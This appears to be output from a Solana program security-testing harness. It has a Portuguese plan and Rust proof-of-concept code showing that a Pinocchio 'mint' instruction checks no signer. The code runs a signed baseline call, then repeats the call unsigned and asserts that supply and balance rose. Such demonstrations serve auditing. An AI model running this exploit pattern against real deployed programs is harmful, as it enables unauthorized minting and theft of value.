{
  "plan": "O programa `mint` (Pinocchio) lê e escreve supply/balance em offsets fixos (40..48 e 48..56) de `accounts[0]`, sem verificar `is_signer`. Vou montar uma conta `ledger` controlada pelo atacante com dados iniciais (supply=100, balance=50) e dono = program_id, e chamar `mint` legitimamente com a conta assinando para provar que o cenário está correto. No ataque, chamo a mesma instrução com o mesmo `amount`, mas removendo a assinatura da conta `ledger` (não-signer). O efeito medido é que supply e balance foram incrementados mesmo sem assinatura, demonstrando que qualquer um pode mintar.",
  "scenario": "let ledger_key = Pubkey::new_unique();
let mut ledger_data = vec![0u8; 56];
ledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());
ledger_data[48..56].copy_from_slice(&50u64.to_le_bytes());
let ledger = account(&env.program_id, &ledger_data, None);

let amount: u64 = 1000;
let mut ix_data = vec![0u8];
ix_data.extend_from_slice(&amount.to_le_bytes());

// Baseline: uso legitimo, ledger assina
let ix_ok = env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, true)]);
let contas_ok = vec![(ledger_key, ledger.clone())];
let r_ok = env.baseline("mint legitimo com assinatura", &ix_ok, &contas_ok);

// Ataque: mesma instrucao, mas ledger NAO assina
let ix_atk = env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, false)]);
let contas_atk = vec![(ledger_key, ledger.clone())];
let r = env.attack("mint sem assinatura da autoridade", &ix_atk, &contas_atk);

if r.program_result == ProgramResult::Success {
    let d = after(&r, &ledger_key).data();
    let supply = read_u64(d, 40);
    let balance = read_u64(d, 48);
    env.effect("supply incrementado sem assinatura", supply == 1100);
    env.effect("balance incrementado sem assinatura", balance == 1050);
}"
}

